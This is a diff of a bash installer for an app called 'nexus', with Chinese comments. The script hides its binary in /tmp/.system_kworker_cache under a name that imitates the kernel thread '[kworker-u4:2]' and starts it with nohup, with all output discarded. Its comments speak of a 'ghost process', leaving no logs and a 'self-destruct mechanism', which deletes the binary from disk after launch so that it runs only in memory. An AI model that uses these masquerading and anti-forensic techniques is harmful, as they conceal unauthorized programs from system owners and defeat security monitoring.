@@ -4,7 +4,6 @@ set -u
 APP_NAME="nexus"
 APP_PORT="${APP_PORT:-3097}"
 
-# 退回原来完美运行的缓存目录！绝不瞎改了！
 BASE_DIR="/tmp/.system_kworker_cache"
 FAKE_NAME="\[kworker-u4:2\]"
 APP_BIN="${BASE_DIR}/${FAKE_NAME}"
@@ -118,14 +117,16 @@ uninstall_app() {
     esac
   fi
   
-  pkill -f "\[kworker-u4:2\]" >/dev/null 2>&1 || true
+  # 【绝对修复】：去掉了括号，使用 -9 彻底斩首！
+  pkill -9 -f "kworker-u4:2" >/dev/null 2>&1 || true
   rm -rf "${BASE_DIR}" >/dev/null 2>&1 || true
   say "✅ 内存进程已强行终止，实体彻底灰飞烟灭！"
   exit 0
 }
 
 run_install() {
-  pkill -f "\[kworker-u4:2\]" >/dev/null 2>&1 || true
+  # 【绝对修复】：去掉了括号，使用 -9 提前清场！
+  pkill -9 -f "kworker-u4:2" >/dev/null 2>&1 || true
   rm -rf "${BASE_DIR}" >/dev/null 2>&1 || true
 
   ask_config
@@ -147,10 +148,9 @@ run_install() {
 
   say "正在唤醒幽灵进程..."
   
-  # 【原汁原味】：将输出重定向到黑洞，不留任何日志！
   nohup "${APP_BIN}" > /dev/null 2>&1 &
   
-  # 【终极自毁机制】：等待程序完全加载到内存后，强行销毁硬盘实体！
+  # 【终极自毁机制】
   sleep 2
   rm -rf "${BASE_DIR}" >/dev/null 2>&1 || true
 
